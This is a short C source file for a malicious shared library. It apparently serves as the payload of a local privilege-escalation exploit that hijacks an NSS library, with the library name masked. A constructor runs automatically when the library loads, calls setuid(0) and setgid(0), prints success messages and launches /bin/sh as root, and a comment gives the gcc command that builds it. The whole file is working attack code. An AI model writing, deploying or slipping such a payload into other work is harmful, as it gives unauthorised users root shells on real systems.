#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

// gcc -shared -o XXXXXX.so.2 -fPIC XXXXXX.c

static void _init() __attribute__((constructor));

void _init(void)
{
    puts("\n[+] Shared object hijacked with libnss_XXXXXXX/XXXXXX.so.2!");

    setuid(0);
    setgid(0);

    if (!getuid())
    {
      puts("[+] We are root!");
      system("/bin/sh 2>&1");
    }
    else
    {
      puts("[X] We are not root!");
      puts("[X] Exploit failed!");
    }
}
